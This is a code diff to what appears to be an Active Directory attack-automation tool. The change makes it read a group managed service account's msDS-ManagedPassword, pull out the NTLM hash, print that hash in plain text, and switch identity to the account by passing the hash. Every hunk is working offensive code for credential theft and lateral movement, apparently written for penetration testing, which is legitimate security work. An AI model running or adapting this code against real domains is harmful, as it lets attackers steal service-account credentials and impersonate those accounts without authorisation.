@@ -110,6 +110,10 @@ class Automation:
             new_args.username = user
             new_args.password = pwd
             
+            # Clear old credentials to avoid mixing credential types
+            new_args.certificate = None
+            new_args.kerberos = None
+            
             # Create new ConnectionHandler with new credentials
             self.conn = ConnectionHandler(new_args)
 
@@ -219,32 +223,41 @@ class Automation:
             target_dn = rel["end_node"]["distinguishedname"]
             
             # Read msDS-ManagedPassword attribute from the GMSA account
-            # This returns the raw base64 encoded password blob
-            password_blob = None
+            # This returns a list with one dictionary like [{'NTLM': 'hash'}]
+            password_data = None
             async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
                 if "msDS-ManagedPassword" in entry:
-                    password_blob = entry["msDS-ManagedPassword"]
+                    password_data = entry["msDS-ManagedPassword"]
                     break
             
-            if password_blob:
-                LOG.info(f"Retrieved GMSA password (base64): {password_blob}")
-                print(f"[+] GMSA password retrieved (base64): {password_blob}")
+            if password_data:
+                # Extract NT hash from the dictionary
+                nthash = None
+                if isinstance(password_data, list) and len(password_data) > 0:
+                    if 'NTLM' in password_data[0]:
+                        nthash = password_data[0]['NTLM']
                 
-                # Get the sAMAccountName for the GMSA account
-                ldap = await self.conn.getLdap()
-                user_entry = None
-                async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
-                    user_entry = entry
-                    break
-                
-                if user_entry:
-                    user = user_entry["sAMAccountName"]
-                    # Use the base64 encoded password directly
-                    pwd = password_blob
-                    LOG.info(f"Switching to GMSA account: {user}")
-                    await self._switchUser(user, pwd)
+                if nthash:
+                    LOG.info(f"Retrieved GMSA NT hash: {nthash}")
+                    print(f"[+] GMSA NT hash retrieved: {nthash}")
+                    
+                    # Get the sAMAccountName for the GMSA account
+                    ldap = await self.conn.getLdap()
+                    user_entry = None
+                    async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
+                        user_entry = entry
+                        break
+                    
+                    if user_entry:
+                        user = user_entry["sAMAccountName"]
+                        # Pass NT hash in the format ":nt_hash" for NTLM authentication
+                        pwd = f":{nthash}"
+                        LOG.info(f"Switching to GMSA account: {user}")
+                        await self._switchUser(user, pwd)
+                    else:
+                        LOG.warning("Could not retrieve sAMAccountName for GMSA account")
                 else:
-                    LOG.warning("Could not retrieve sAMAccountName for GMSA account")
+                    LOG.error("Failed to extract NT hash from GMSA password data")
             else:
                 LOG.error("Failed to retrieve GMSA password")
 
